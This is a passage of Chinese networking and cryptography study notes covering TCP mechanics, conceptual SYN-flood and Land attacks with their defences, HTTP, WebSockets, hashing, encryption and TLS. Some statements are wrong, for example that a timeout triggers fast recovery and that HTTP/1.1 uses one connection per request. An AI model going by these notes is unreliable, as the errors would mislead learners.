Size，16位）：表示发送方当前可接收的数据量（以字节为单位）。\n校验和（Checksum，16位）：用于检测报文在传输过程中是否发生错误。\n紧急指针（Urgent Pointer，16位）：仅在URG标志位被设置时有效，表示紧急数据在报文中的偏移量。\n选项（Options，可选，长度可变）：包含了一些可选的TCP功能，如最大报文长度（MSS）、窗口扩大因子（Window Scale）和选择性确认（SACK）等。\n填充（Padding，可选，长度可变）：用于保证TCP首部的长度为32位字的整数倍。\n\nTCP报文首部后面的数据部分包含了实际要传输的数据。TCP通过将数据划分为多个报文并为每个报文分配一个唯一的序列号，实现了可靠的、面向连接的数据传输。\nTCP连接的状态TCP连接的建立、数据传输和断开过程涉及多种状态。以下是TCP连接状态的详细说明：\n\nCLOSED：初始状态，表示没有建立连接，也没有活动的连接。\nLISTEN：服务器处于侦听状态，等待客户端发送连接请求。这是服务器主动打开的初始状态。\nSYN_SENT：客户端发送SYN报文后，进入SYN_SENT状态。这表示客户端已发送连接请求，等待服务器的回应。\nSYN_RECEIVED：服务器收到客户端的SYN报文后，发送自己的SYN报文和确认ACK报文，进入SYN_RECEIVED状态。这表示服务器已确认客户端的连接请求，等待客户端确认。\nESTABLISHED：双方都收到并确认对方的SYN报文后，连接建立成功，进入ESTABLISHED状态。此时，双方可以开始数据传输。\nFIN_WAIT_1：当客户端完成数据传输并发送FIN报文后，进入FIN_WAIT_1状态。这表示客户端请求关闭连接，等待服务器的确认。\nFIN_WAIT_2：客户端收到服务器对FIN报文的确认ACK报文后，进入FIN_WAIT_2状态。此时，客户端等待服务器发送自己的FIN报文，表示服务器已完成数据传输。\nCLOSE_WAIT：服务器收到客户端的FIN报文后，进入CLOSE_WAIT状态。这表示服务器已确认客户端的关闭请求，但仍需等待服务器完成数据传输。\nLAST_ACK：服务器在发送FIN报文后，进入LAST_ACK状态。这表示服务器等待客户端对其FIN报文的确认。\nTIME_WAIT：客户端收到服务器的FIN报文并确认后，进入TIME_WAIT状态。客户端会在这个状态持续一段时间（通常为2倍的最大分段生存时间，MSL），以确保服务器收到对其FIN报文的确认。之后，客户端进入CLOSED状态，关闭连接。\nCLOSED：连接已完全关闭，可以释放所有相关资源。\n\n这些状态描述了TCP连接的整个生命周期，包括连接建立、数据传输和连接关闭\n三次握手三次握手的过程TCP三次握手（Three-Way Handshake）是建立TCP连接的过程，通过三次交换控制报文来确认双方的收发能力和同步双方的初始序列号。以下是TCP三次握手的详细步骤：\n\nSYN：客户端发送一个TCP报文，其中SYN（Synchronize Sequence Numbers，同步序列号）标志位被设置为1，表示这是一个连接请求。客户端还会选择一个初始序列号x，并将其放入报文的序列号字段。\n\nSYN-ACK：服务器收到客户端的SYN报文后，会发送一个响应报文。在这个报文中，SYN标志位和ACK（Acknowledge，确认）标志位都被设置为1。服务器也会选择一个初始序列号y，并将其放入报文的序列号字段。同时，服务器会将客户端报文序列号x加1，并将结果放入报文的确认号字段，表示期望收到客户端下一个报文的序列号。\n\nACK：客户端收到服务器的SYN-ACK报文后，会发送一个ACK报文。在这个报文中，ACK标志位被设置为1。客户端会将服务器报文的序列号y加1，并将结果放入报文的确认号字段，表示期望收到服务器下一个报文的序列号。至此，TCP三次握手完成，双方建立起了连接。\n\n\n在TCP三次握手过程中，客户端和服务器分别为自己的报文选择初始序列号。\n总之，TCP三次握手是建立TCP连接的过程，包括以下三个步骤：\n\n客户端发送SYN报文，请求连接，并设置初始序列号x。\n服务器回复SYN-ACK报文，确认连接请求，设置初始序列号y，确认号为x+1。\n客户端发送ACK报文，确认服务器的SYN-ACK，确认号为y+1。\n\n握手完成后，TCP连接建立，数据传输开始。\n三次而不是两次握手的原因TCP三次握手的主要目的是在不可靠的网络环境中实现可靠的连接建立。三次握手的过程可以确保双方都具备收发数据的能力，并能同步双方的初始序列号。这里详细说明为什么需要三次握手：\n\n确认收发能力：通过三次握手，客户端和服务器可以确认对方的收发能力。首先，客户端发送SYN报文表示其具备发送能力；其次，服务器回复SYN-ACK报文表示其具备接收和发送能力；最后，客户端发送ACK报文表示其具备接收能力。这个过程确保了双方在连接建立后都能正常地收发数据。\n\n同步初始序列号：在TCP协议中，每个字节都有唯一的序列号。为了实现可靠的数据传输，客户端和服务器需要在建立连接时同步各自的初始序列号。在三次握手过程中，客户端和服务器分别为自己的报文选择初始序列号，并在握手过程中交换这些序列号。这样，双方都能知道对方期望收到的第一个字节的序列号，从而为后续的数据传输做好准备。\n\n\n如果只进行两次握手，客户端和服务器之间的连接可能不可靠。例如，客户端发送SYN报文后，服务器回复SYN-ACK报文，但无法确认客户端是否具备接收能力。这可能导致服务器发送的数据无法被客户端正确接收，从而影响通信质量。因此，为了实现可靠的连接建立，TCP协议采用了三次握手的机制。\n对TCP三次握手的DoS攻击Connection Flood攻击Connection Flood攻击是一种DoS（Denial of Service ，拒绝服务）攻击，其主要目标是消耗目标服务器的连接资源，使其无法处理新的合法连接请求。这种攻击方法通常通过发送大量的连接请求或半打开的连接来实现。\n在Connection Flood攻击中，攻击者通常采取以下步骤：\n\n攻击者向目标服务器发送大量的连接请求，可能使用合法或伪造的IP地址。\n目标服务器在收到连接请求后，尝试为每个请求分配资源，以处理并维护这些连接。\n随着连接数量的增加，目标服务器的资源逐渐耗尽，导致无法处理新的合法连接请求。\n\nConnection Flood攻击可能针对不同的协议和服务，例如HTTP连接泛洪、TCP连接泛洪或TLS&#x2F;SSL连接泛洪。\n为了防御Connection Flood攻击，可以采取以下措施：\n\n限制连接速率：为单个IP地址或子网设置连接速率限制，以防止攻击者短时间内发送大量连接请求。\n连接队列管理：优化连接队列策略，例如缩短超时时间、增加队列大小等，以提高服务器处理连接请求的能力。\n负载均衡：通过负载均衡技术将连接请求分发到多个服务器，以减轻单个服务器的压力，并提高整体服务的抗攻击能力。\nIP地址过滤：使用防火墙或其他安全设备过滤来自可疑或恶意IP地址的连接请求。\n\nSYN攻击SYN攻击（也称为TCP SYN泛洪攻击）是一种利用TCP协议三次握手机制进行的DoS攻击。攻击者向目标服务器发送大量伪造源IP地址的SYN报文，目的是消耗服务器的资源，使正常用户无法访问该服务器。以下是SYN攻击的详细过程：\n\n攻击者向目标服务器发送大量SYN报文，这些报文的源IP地址是伪造的。每个SYN报文都表示一个连接请求。\n目标服务器收到SYN报文后，会为每个报文分配一个半连接（half-open connection），并回复SYN-ACK报文。由于源IP地址是伪造的，这些SYN-ACK报文无法到达真正的发送方。\n目标服务器等待攻击者发送ACK报文以完成握手过程。然而，由于源IP地址是伪造的，ACK报文永远不会到达。目标服务器会在一定时间内保留这些半连接，直到超时。\n攻击者持续发送大量伪造的SYN报文，导致目标服务器的资源耗尽，从而无法处理正常用户的连接请求。\n\nSYN攻击的危害在于它可以通过较少的资源（例如，较低的带宽和较少的报文）消耗大量服务器资源，从而实现拒绝服务的目的。防御SYN攻击的方法包括：\n\n缩短超时时间：减少服务器等待ACK报文的时间，以便更快地释放半连接资源。\n过滤伪造的IP地址：部署网络设备（例如防火墙和入侵检测系统）来识别并阻止伪造的IP地址，以减少SYN攻击的影响。\n增加半连接队列大小：增加服务器可以处理的半连接数量，以应对大量的SYN报文。\nSYN cookies：服务器在回复SYN-ACK报文时，使用一种称为SYN cookies的技术生成确认号，而不是分配半连接。当收到有效的ACK报文时，服务器可以通过确认号重新构建连接状态，从而避免为伪造的SYN报文分配资源。\n\n尽管SYN攻击是一种比较古老的攻击方式，但它仍然具有一定的威胁。通过采用合适的防御措施，可以降低SYN攻击对服务器的影响。\nLand攻击Land攻击是一种DoS攻击类型，这种攻击利用TCP&#x2F;IP协议的漏洞，通过发送伪造的数据包来使目标系统无法正常工作。Land攻击的特点是发送的数据包的源IP地址和目标IP地址相同，同时源端口和目标端口也相同。\nLand攻击的过程如下：\n\n攻击者构造一个伪造的TCP数据包，将源IP地址和目标IP地址设置为目标系统的IP地址，同时将源端口和目标端口设置为相同的端口号。\n攻击者发送这个伪造的数据包到目标系统。\n目标系统在收到这个数据包后，由于源IP地址和目标IP地址相同，尝试与自身建立连接。这会导致目标系统的资源消耗，进而可能导致系统崩溃或无法响应其他合法请求。\n\nLand攻击在20世纪90年代是一种较为常见的攻击手段，但现在大部分操作系统和网络设备已经修复了相关漏洞，不再受此类攻击影响。然而，为了防止潜在的Land攻击，可以采取以下措施：\n\n更新操作系统和网络设备的软件，确保已修复相关漏洞。\n配置防火墙和入侵检测系统（IDS）来识别并过滤伪造的数据包。\n监控网络流量，以检测异常数据包和潜在的攻击行为。\n\n四次挥手四次挥手的过程TCP四次挥手是TCP连接在传输完成后进行断开的过程。TCP（传输控制协议）是一种面向连接的协议，因此在数据传输完成后，需要通过一个四步过程来正常关闭连接。以下是TCP四次挥手的详细步骤：\n\n第一次挥手：客户端向服务器发送一个FIN报文，表示客户端已经完成数据传输，请求关闭连接。此时，客户端进入FIN_WAIT_1状态。\n\n第二次挥手：服务器收到客户端发送的FIN报文后，会发送一个ACK报文确认客户端的FIN报文已收到。此时，服务器进入CLOSE_WAIT状态，而客户端收到ACK报文后进入FIN_WAIT_2状态。\n\n第三次挥手：当服务器完成数据传输后，也会向客户端发送一个FIN报文，表示服务器同意关闭连接。此时，服务器进入LAST_ACK状态。\n\n第四次挥手：客户端在收到服务器的 FIN 报文后，发送 ACK 报文确认并进入 TIME_WAIT 状态。服务器收到 ACK 报文后，立即关闭连接。2 倍 MSL（Maximum Segment Lifetime，最大分段生存时间），约 2 分钟后，客户端关闭连接。\n\n\n要有TIME_WAIT状态的原因 TIME_WAIT状态存在于TCP连接关闭过程中，具有几个重要的原因：\n\n确保最后一个ACK报文被对方接收：在TCP四次挥手过程中，客户端发送最后一个ACK报文确认收到服务器的FIN报文。TIME_WAIT状态确保了这个ACK报文能够被服务器正确接收。如果服务器没有收到这个确认报文，它会重发FIN报文。此时，由于客户端仍处于TIME_WAIT状态，可以再次发送ACK报文进行确认。\n\n处理延迟的数据包：在TIME_WAIT状态期间，客户端可以处理可能延迟到达的数据包。这有助于确保连接关闭前的所有数据包都被正确处理，防止数据丢失或错误。\n\n防止旧连接数据包干扰新连接：TCP连接由源IP、目标IP、源端口和目标端口四元组唯一确定。在某些情况下，相同的四元组可能在短时间内被重新用于新的连接。TIME_WAIT状态可以防止旧连接中仍在网络中传输的数据包干扰新连接。客户端在TIME_WAIT状态持续一段时间（通常为2MSL），以确保旧连接的数据包从网络中消失。\n\n\n总之，TIME_WAIT状态在TCP连接关闭过程中发挥了重要作用，它确保了最后一个ACK报文被接收、处理延迟数据包和防止旧连接数据包干扰新连接。这有助于维护TCP连接的可靠性和数据传输的完整性。\n关闭连接的需要四次挥手，而建立连接只要三次握手的原因三次握手的过程可以确保双方都具备收发数据的能力，并能同步双方的初始序列号。确认过程中间有一个合并的SYN和ACK，所以是三步。\n关闭连接需要四次挥手，因为 TCP 是全双工的，双方需要独立地确认对方已经完成数据发送，服务端收到SYN时可能还不能关闭连接，不能合并ACK和FIN，所以是四步。\nTCP流量控制滑动窗口机制TCP协议使用以字节为单位的滑动窗口协议来控制字节流的发送\n 窗口是缓存的一部分，用来暂时存放字节流。发送方和接收方各有一个窗口，接收方通过 TCP 报文段中的窗口字段告诉发送方自己的窗口大小，发送方根据这个值和其它信息设置自己的窗口大小。发送窗口内的字节都允许被发送，接收窗口内的字节都允许被接收。如果发送窗口前部的字节已经发送并且收到了确认，那么就将发送窗口向后滑动一定距离，直到第一个字节不是已发送并且已确认的状态；接收窗口的滑动类似，接收窗口前部字节为已经接收到的字节，收到数据并发送确认后，就向后滑动接收窗口，直到接收窗口为0。  \n确认重传机制在TCP中，选择性重传的实现原理主要依赖于选择性确认（Selective Acknowledgment, SACK）机制。SACK是一种TCP扩展，其目的是改进TCP在数据包丢失的情况下的性能。它允许接收方在确认报文中指定已成功接收的不连续数据段，从而使发送方可以更精确地了解哪些报文段需要重传。\nSACK是通过在TCP报文头部添加选项字段来实现的。以下是SACK实现的主要步骤：\n\n协商SACK：在TCP连接建立过程中，双方通过在SYN和SYN-ACK报文中包含SACK-permitted选项来表示支持SACK。\n接收数据并生成SACK块：接收方在接收数据时，记录每个已成功接收的数据段的左边界和右边界，并按照顺序排列。接收方在发送确认报文（ACK）时，会在TCP头部选项字段中加入SACK选项。SACK选项包含一个或多个SACK块，每个SACK块表示一个已成功接收的不连续数据段范围（左边界和右边界）。\n处理SACK报文并重传数据：发送方在收到包含SACK选项的确认报文后，会根据其中的信息判断哪些报文段需要重传。发送方只需要重传那些未被确认的报文段，而已成功接收的数据段不会被重传。\n\nTCP拥塞控制算法TCP维护了一个拥塞窗口（cwnd，congestion window），窗口大小是发送端可以往网络发送的不会产生网络阻塞的字节数\n慢启动算法慢启动用于在TCP连接开始时cwnd从初始值1逐渐（指数级）增加数据发送速率和传输窗口大小。发送端为连接维护了一个慢启动阈值（ssthread，slow start thread），一旦慢启动超过了慢启动阈值，TCP就从慢启动切换到拥塞避免算法（线性增加）\n\n当cwnd &lt; ssthread，使用慢启动算法\n当cwnd &gt; ssthread，使用拥塞避免算法\n当cwnd &#x3D; ssthread，既可以使用慢启动算法，也可以使用拥塞避免算法\n\n拥塞避免算法拥塞避免算法的思路是让cwnd缓慢增大，即每经过一个往返时间（RTT，Round-Trip Time）就把发送方的cwnd加1\n快速恢复算法如果发送方接收到3个或3个以上的重复确认时，就认为网络出现了拥塞，此时将启用快速恢复算法\n当发生超时，不是进行慢启动，而是进行快速恢复，先将ssthread设为cwnd&#x2F;2，再将cwnd设为ssthread，然后执行拥塞避免算法\n快速重传算法如果发送方接收到3个或3个以上的重复确认（duplicate ACK）时，就认为前面发送的数据包已经丢失，立即重传这些数据包而不是等待超时重传，但是在重传之前会先执行快速恢复算法，以减轻网络拥塞\n粘包、拆包TCP粘包和拆包是指在TCP传输过程中，发送方发送的多个小数据包被接收方合并成一个大数据包（粘包），或者一个大数据包被接收方拆分成多个小数据包（拆包）的现象。\n造成TCP粘包和拆包的主要原因是TCP协议是面向流的，发送方和接收方之间没有明显的分界点，数据以字节流的形式进行传输。这就导致了发送方发送的多个小数据包可能会在接收方端被合并成一个大数据包，或者一个大数据包在传输过程中被拆分成多个小数据包。\n为了避免TCP粘包和拆包现象，通常需要进行数据分包和数据拆包处理。数据分包是将待发送的数据按照固定大小的数据块进行分割，以便接收方能够正确接收数据。数据拆包则是将接收到的大数据包拆分成多个小数据包，以便上层应用程序能够正确处理数据。\n常用的TCP粘包和拆包处理方式包括：\n\n固定长度分包：将数据按照固定长度进行分包，接收方按照相同的长度进行接收和处理。\n在数据包头部增加数据长度信息：将数据长度信息添加到数据包头部，接收方根据长度信息进行接收和处理。\n使用分隔符分包：将不同数据块之间加上特定的分隔符进行分包。\n\n通过这些处理方式，可以有效避免TCP粘包和拆包现象，保证数据传输的正确性和完整性。\nUDPUDP（User Datagram Protocol）是一种无连接、不可靠的传输层协议，它以尽可能少的开销提供了一种面向事务的简单传输服务。相比于TCP协议，UDP协议不具备可靠性和流量控制机制，但是它具有传输速度快、数据包大小灵活等优势，在实时应用场景中得到广泛应用。\nUDP协议的主要特点如下：\n\n无连接：UDP协议不需要进行连接建立和释放操作，直接向目标主机发送数据包即可，因此传输效率较高。\n面向报文：UDP协议对应用层传递的报文既不合并也不拆分，以数据包为单位进行传输。\n无流量控制：UDP协议不具备流量控制机制，发送方按照自己的速度发送数据包，而不考虑接收方的接收能力。\n无拥塞控制：发送方可以按照自己的速度发送数据包，不会对网络拥塞状况进行检测。\n无重传机制：在UDP协议中，如果某个数据包在传输过程中丢失或损坏，UDP协议不会进行重传，也不会通知发送方，是不可靠的。\n\nUDP协议在实时应用场景中得到广泛应用，如视频、语音、游戏等实时性要求较高的应用。由于UDP协议具有传输速度快、数据包大小灵活等优势，能够满足实时应用的要求，并且由于无连接、无可靠性等特点，使得实现简单，成本低廉。但是，也由于UDP协议不具备可靠性和流量控制机制，因此在需要数据传输的可靠性和稳定性的应用场景中，如文件传输、邮件等，通常使用TCP协议来保证传输的可靠性。\nHTTP特点HTTP是明文传输的、无状态的（关闭后客户端和服务端都不会保留任何上一次连接的信息）\n短连接短连接的特点：\n\n是HTTP&#x2F;1.0的默认方式，每次请求都需要重新建立连接，可能导致较高的开销。HTTP&#x2F;1.0 也提供了长连接选项，使用方法是在请求头中加入Connection: Keep-alive选项。\n由于连接频繁建立和关闭，服务器可能需要处理大量的连接请求。\n\n短连接的适用场景：\n\n不需要长时间维持连接的场景。\n低频率请求\n\n长连接长连接的特点：\n\n是HTTP&#x2F;1.1的默认方式，允许客户端在一个连接上发送多个请求，而不必每次都重新建立连接。\n减少了重新建立连接的开销\n长连接可能会占用服务器资源，因为连接在使用完后不会立即关闭。\n\n长连接的适用场景：\n\n需要长时间维持连接的场景，如实时应用和高频通信。\n高频率请求\n\n多路复用在HTTP&#x2F;1.1中，每个请求和响应都需要单独的TCP连接。虽然HTTP&#x2F;1.1引入了长连接来减少连接开销，但在每个连接上仍然只能同时处理一个请求，如果一个请求占用了连接，其他请求必须等待，就会导致队头阻塞问题。\nHTTP&#x2F;2的多路复用允许在单个TCP连接上同时发送和接收多个请求和响应，避免了队头阻塞\nQUICHTTP&#x2F;2.0 是基于 TCP 协议实现的，HTTP&#x2F;3.0 新增了 QUIC（Quick UDP Internet Connections） 协议来实现可靠的传输，提供与 TLS&#x2F;SSL 相当的安全性，具有更低的连接和传输延迟。\n状态码HTTP 状态码（HTTP Status Codes）是服务器用于表示客户端请求结果的三位数字。状态码分为五类，各类状态码的含义如下：\n1xx（信息响应）：请求已接收，继续处理。\n2xx（成功）：请求已成功接收、理解和接受。\n3xx（重定向）：需要后续操作才能完成请求。\n4xx（客户端错误）：请求包含错误语法或无法完成。\n5xx（服务器错误）：服务器在处理请求时发生错误。\n\n\n\n状态码\n描述\n\n\n\n100\nContinue: 请求已接收，继续处理。\n\n\n200\nOK: 请求成功，服务器已经处理了请求并返回了所需数据。\n\n\n201\nCreated: 请求成功并已创建了新资源。\n\n\n202\nAccepted: 请求已被接受，但尚未处理。\n\n\n204\nNo Content: 请求成功，但无需返回任何内容。\n\n\n300\nMultiple Choices: 请求的资源有多个表示。\n\n\n301\nMoved Permanently: 请求的资源已被永久移动到新的 URL。\n\n\n302\nFound: 请求的资源临时移动到新的 URL。\n\n\n303\nSee Other: 对于 POST 请求，资源的响应可以在另一个 URL 上找到。\n\n\n304\nNot Modified: 资源自上次请求以来未发生更改。\n\n\n307\nTemporary Redirect: 请求的资源临时移动到新的 URL。\n\n\n308\nPermanent Redirect: 请求的资源已被永久移动到新的 URL。\n\n\n400\nBad Request: 请求格式错误或服务器无法理解请求。\n\n\n401\nUnauthorized: 请求需要认证。客户端应提供认证信息。\n\n\n403\nForbidden: 客户端没有权限访问所请求的资源。\n\n\n404\nNot Found: 服务器找不到请求的资源。\n\n\n405\nMethod Not Allowed: 请求方法（GET、POST 等）对于所请求的资源不允许。\n\n\n500\nInternal Server Error: 服务器在处理请求时遇到内部错误。\n\n\n501\nNot Implemented: 服务器不支持请求所需要的功能。\n\n\n502\nBad Gateway: 作为网关或代理角色的服务器从上游服务器接收到无效响应。\n\n\n503\nService Unavailable: 服务器暂时无法处理请求（由于过载或维护）。\n\n\n504\nGateway Timeout: 作为网关或代理角色的服务器未及时从上游服务器收到请求。\n\n\n请求转发和重定向的区别请求转发（Forward）和重定向（Redirect）是Web应用程序中处理客户端的请求的两种不同的处理方式。它们的区别在于处理请求的方式和客户端的感知。\n\n请求转发（Forward）： 请求转发是指在服务器内部将请求从一个资源传递到另一个资源，在这个过程中，客户端的URL地址不会改变，也不会不会涉及到HTTP状态码的变化，客户端对此过程是不可见的。请求转发速度较快，因为服务器直接将请求转发给另一个资源，减少了额外的网络往返。\n重定向（Redirect）： 重定向是指服务器接收到客户端的请求后，向客户端返回一个特殊的响应（通常是HTTP状态码 3xx），告诉客户端要访问一个新的URL地址。客户端在接收到这个响应后，会主动发起一个新的请求，跳转到指定的URL地址。因此，客户端会感知到URL地址的改变。\n\nWebSocketsWebSockets解决的问题HTTP通信协议有一个缺陷：通信只能由客户端发起，做不到服务器主动向客户端推送信息。这种单向请求的特点，注定了如果服务器有连续的状态变化，客户端要获知就非常麻烦。就只能使用轮询，每隔一段时候，就发出一个请求，轮询的效率低，且非常浪费资源。\nWebSocket通信协议，最大特点就是，服务器可以主动向客户端推送信息，客户端也可以主动向服务器发送信息，是真正的双向平等对话，属于服务器推送技术的一种。\n其他特点包括：\n\n建立在 TCP 协议之上，服务器端的实现比较容易。\n\n与 HTTP 协议有着良好的兼容性。默认端口也是80和443，并且握手阶段采用 HTTP 协议，因此握手时不容易屏蔽，能通过各种 HTTP 代理服务器。\n\n数据格式比较轻量，性能开销小，通信高效。\n\n可以发送文本，也可以发送二进制数据。\n\n没有同源限制，客户端可以与任意服务器通信。\n\n协议标识符是ws（如果加密，则为wss），服务器网址就是 URL。\nws://example.com:80/some/path\n\n用法示例\n导入WebSocket依赖包spring-boot-starter-websocket。\n在服务端代码中使用@ServerEndpoint注解将类标注为 WebSocket 服务器。&quot;/websocket/&#123;userId&#125;&quot;是请求的路径。\n在前端代码中打开WebSocket连接。\n\n哈希算法哈希算法（Hash algorithm）是密码学领域中的一种重要技术，它将任意长度的输入数据（通常称为消息）映射到固定长度的输出（通常称为哈希值、摘要或指纹）。哈希算法具有许多实际应用，如数据完整性验证、消息认证、数字签名以及密码存储等。\n一个优秀的哈希算法应具有以下特性：\n\n确定性：对于相同的输入，哈希算法总是产生相同的输出。\n高效性：哈希算法应能快速地计算出输入数据的哈希值。\n单向性（预映像抗性）：给定一个哈希值，计算出原始输入数据应是非常困难的。\n二次预映像抗性：给定一个输入数据，找到另一个不同的输入，使其具有相同的哈希值，应该是非常困难的。\n抗碰撞性：找到任意两个不同的输入，它们具有相同的哈希值，应该是非常困难的。\n随机性：哈希值的输出应该看起来是随机的，即使对于相似的输入，它们的哈希值也应该有很大差异。\n\n在密码学中，常用的哈希算法有：\n\nMD5（Message Digest Algorithm 5）：MD5是一种广泛使用的哈希算法，产生128位（16字节）的哈希值。然而，由于已知的安全漏洞，如碰撞攻击，MD5不再被认为是安全的哈希算法。\n\nSHA-1（Secure Hash Algorithm 1）：SHA-1是一种哈希算法，产生160位（20字节）的哈希值。与MD5类似，由于已知的安全漏洞，如碰撞攻击，SHA-1也不再被认为是安全的哈希算法。\n\nSHA-2（Secure Hash Algorithm 2）：SHA-2是一种哈希算法族，包括SHA-256、SHA-512等，分别产生不同长度的哈希值（256bit、512bit等），比SHA-1和MD5更安全，是目前安全的、推荐使用的Hash算法。\n在Java中，SHA-2（Secure Hash Algorithm 2）是通过Java标准库中的MessageDigest类来实现的。\npublic static String encode(String str) throws NoSuchAlgorithmException &#123;\t//确定加密方法\tMessageDigest messageDigest = MessageDigest.getInstance(&quot;SHA-256&quot;);\t//加密字符串\treturn Arrays.toString(messageDigest.digest(str.getBytes(StandardCharsets.UTF_8)));&#125;\n\nSHA-3（Secure Hash Algorithm 3）：SHA-3是一种新的哈希算法族，包括SHA3-256、SHA3-512等。是安全的。\n\n\n碰撞攻击：\n碰撞攻击（Collision attack）是一种针对哈希算法的攻击方法，其目标是找到两个不同的输入数据，它们具有相同的哈希值。理论上，一个理想的哈希函数应具有较高的抗碰撞性，即使计算能力非常强大，也应该很难找到具有相同哈希值的两个不同输入。\n然而，在实际中，许多哈希算法（如MD5和SHA-1）已经被证明存在碰撞攻击的漏洞。这些漏洞使攻击者能够在相对较短的时间内找到具有相同哈希值的不同输入，从而破坏哈希算法的安全性。\n碰撞攻击的成功可能导致以下安全问题：\n\n伪造数字签名：如果攻击者能够找到两个具有相同哈希值的不同文档，他们可以使一个文档的有效数字签名适用于另一个文档，从而实现伪造。\n证书颁发伪造：攻击者可以利用碰撞攻击创建具有相同哈希值的伪造证书，从而破坏SSL&#x2F;TLS等安全通信协议的信任基础。\n数据完整性损害：哈希函数通常用于检查数据的完整性，如下载文件的校验。如果攻击者能够创建具有相同哈希值的恶意文件，用户可能会在不知情的情况下下载和使用这些文件。\n\n为了防范碰撞攻击，密码学家和研究人员持续开发新的、更安全的哈希算法。例如，SHA-2和SHA-3系列哈希算法被认为比MD5和SHA-1更抗碰撞攻击。通过使用更安全的哈希算法，可以提高数据完整性、消息认证和数字签名等应用的安全性。\n加密算法对称加密算法对称加密算法是密码学中的一种加密方法，使用相同的密钥对数据进行加密和解密，所以这种加密算法被称为对称加密算法。对称加密算法通常比非对称加密算法更快，因为它们在计算上相对简单。然而，密钥管理和安全密钥分发是对称加密算法面临的挑战。\n以下是一些常见的对称加密算法：\n\nDES（Data Encryption Standard）：DES是一种曾广泛使用的对称加密算法，它使用56位密钥对数据进行加密。安全性低（曾被破解），不建议使用DES进行加密。\n3DES（Triple DES ）：3DES是DES的改进版本，通过对数据应用三次DES加密操作来增加安全性。尽管3DES比DES更安全，但它的加密速度较慢，并且已经有更安全、更高效的替代方案。\nAES（Advanced Encryption Standard）：AES是现代对称加密算法的事实标准，支持128、192和256位密钥长度，安全性高且加密速度快。AES被广泛应用于各种安全场景，如文件加密、安全通信和网络安全等。\nTwofish：Twofish是Blowfish算法的继任者，也是AES算法竞争过程中的一个候选算法。Twofish使用128位的块大小和可变长度的密钥（128、192或256位）。尽管它在安全性和效率方面表现良好，但它没有像AES那样被广泛采用。\n\n对称加密算法在许多密码学应用中都有广泛应用，如保护数据的机密性、安全通信和身份认证等。然而，它们的一个主要局限性是密钥管理和分发。在许多场景中，对称加密算法与非对称加密算法结合使用。在这种混合方法中，非对称加密算法用于安全地交换对称密钥，而对称加密算法则用于实际的数据加密和解密。这种组合利用了非对称加密算法在密钥管理和分发方面安全性高的优势，同时保留了对称加密算法在数据加密和解密方面的高效性。\n非对称密钥算法非对称密钥算法，又称数字签名算法，是一种加密和解密过程中使用不同密钥的加密方法。在非对称加密算法中，通常有一对密钥，一个是公钥，另一个是私钥。公钥、私钥都可以用来加密和解密，并且一方加密的内容只能由对方进行解密。\n以下是常见的非对称密钥算法：\n\nRSA（Rivest-Shamir-Adleman）算法：RSA 是一种广泛应用的非对称加密算法，由 Ron Rivest、Adi Shamir 和 Leonard Adleman 于 1978 年发明。RSA 算法基于大数因子分解问题，它的安全性依赖于大数分解的困难性。RSA 用于加密、解密和数字签名，应用领域包括网页浏览器、电子邮件、VPN 等。\n\nElGamal 算法：ElGamal 算法由 Taher ElGamal 于 1985 年提出，基于有限域上的离散对数问题。ElGamal 算法主要应用于加密和数字签名，安全性取决于离散对数问题的难度。\n\nECC（Elliptic Curve Cryptography）：椭圆曲线密码学是一种基于椭圆曲线数学理论的非对称加密算法。ECC 相较于 RSA 和 ElGamal 算法具有更高的安全性和更短的密钥长度，因此在资源受限的环境（如物联网设备、智能卡等）中具有优势。ECC 可应用于加密、解密、数字签名和密钥协商等多个场景。\n\nDSA（Digital Signature Algorithm）：DSA 是一种专门用于数字签名的非对称加密算法，由美国国家安全局（NSA）和美国国家标准与技术研究院（NIST）在 1991 年共同开发。DSA 是基于离散对数问题的，与 ElGamal 算法有相似之处。DSA 的安全性取决于离散对数问题的难度。\n\nLattice-based cryptography（格基密码学）：格基密码学是一种基于格数学的非对称加密算法，它具有抵抗量子计算机攻击的潜力。NTRU 和 Learning With Errors（LWE）是目前最知名的格基密码学算法。随着量子计算机的发展，格基密码学可能在未来成为一种重要的密码学工具。\n\n\nSSL&#x2F;TLSSSL（安全套接层）和TLS（传输层安全）的关系是发展演进关系。TLS是SSL的更新和改进版本。虽然二者经常一起提及，但目前主要使用的是TLS协议，因为它比SSL更安全、更先进。\nTLS的工作原理：\n\n首先使用非对称加密算法实现验证服务端身份以及协商对称加密使用的密钥\n后续采用对称加密算法对数据进行加密\n\n这样，SSL&#x2F;TLS协议在服务器和客户端之间的通信使用了混合加密方案，既能确保密钥的安全分发，又能保证数据加密的高效性\nTLS 握手有哪些步骤？\nTLS 握手是由客户端和服务器交换的一系列数据报或消息。TLS 握手涉及多个步骤，因为客户端和服务器要交换完成握手和进行进一步对话所需的信息。\nTLS 握手中的确切步骤将根据所使用的密钥交换算法的种类和双方支持的密码套件而有所不同。大致如下：\n\n“客户端发送问候（client hello）” 消息： 客户端通过向服务器发送“问候”消息来开始握手。该消息将包含客户端支持的 TLS 版本，支持的密码套件（密码套件是一组用于建立安全通信连接的算法），以及称为一串称为“客户端随机数（client random）”的随机字节。\n\n“服务器发送问候（server hello）”消息：作为对 client hello 消息的回复，服务器发送一条消息，内含服务器的 SSL 证书（SSL证书是一种数字证书，是由数字证书颁发机构（CA，Certificate Authority）签发的数字证书的一种 ）、服务器选择的密码套件，以及“服务器随机数（server random）”，即由服务器生成的另一串随机字节。此外还有使用服务器对原始数据的数字签名（数字签名的生成方式见下文）。\n\n客户端对服务端进行身份验证： 客户端使用颁发该证书的证书颁发机构的公钥验证服务器的身份。此举确认服务器是其声称的身份，且客户端正在与该域的实际所有者进行交互。\n\n客户端发送预主密钥： 客户端再发送一串使用服务端公钥加密后的随机字节，即“预主密钥（premaster secret）”，用于协商会话密钥。对预主密钥加密用的服务端公钥从服务器的 SSL 证书中获得的。\n整个建立连接的过程中，客户端发送的包含预主密钥的消息，是使用非对称加密算法进行加密的消息，是安全的，所以根据预主密钥生成的会话密钥也是安全的。\n\n服务端解密得到预主密钥：服务器使用私钥对消息解密得到预主密钥。\n\n客户端和服务器分别生成会话密钥：客户端和服务器均使用客户端随机数、服务器随机数和预主密钥生成会话密钥。双方应得到相同的结果。\n\n客户端发送就绪：客户端发送一条“已完成”消息，该消息用会话密钥加密。\n\n服务器发送就绪：服务器发送一条“已完成”消息，该消息用会话密钥加密。\n\n实现安全对称加密：已完成握手，并使用会话密钥继续进行通信。\n\n\n数字签名数字签名的作用：验证数据的完整性和来源的真实性。\n数字签名的生成方式：\n\n将要签名的数据通过哈希算法即散列函数（如 